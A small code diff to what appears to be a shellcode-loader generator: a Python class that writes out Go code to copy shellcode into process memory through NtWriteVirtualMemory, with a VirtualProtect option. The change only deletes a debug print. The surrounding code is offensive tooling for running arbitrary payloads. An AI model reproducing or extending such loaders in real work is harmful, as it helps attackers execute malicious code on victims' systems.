@@ -53,7 +53,6 @@ class shellcoderunner:
     var numBytes uintptr = {shellcodeSize}
     var numWritten uintptr = 0
 	_, _, _ = {NtWriteVirtualMemory}(^uintptr(0), addr, uintptr(unsafe.Pointer(&shellcode[0])), numBytes, uintptr(unsafe.Pointer(&numWritten)))
-    fmt.Printf("%d", numWritten)
 """
 
         if self.args['protect'] == 'VirtualProtect':
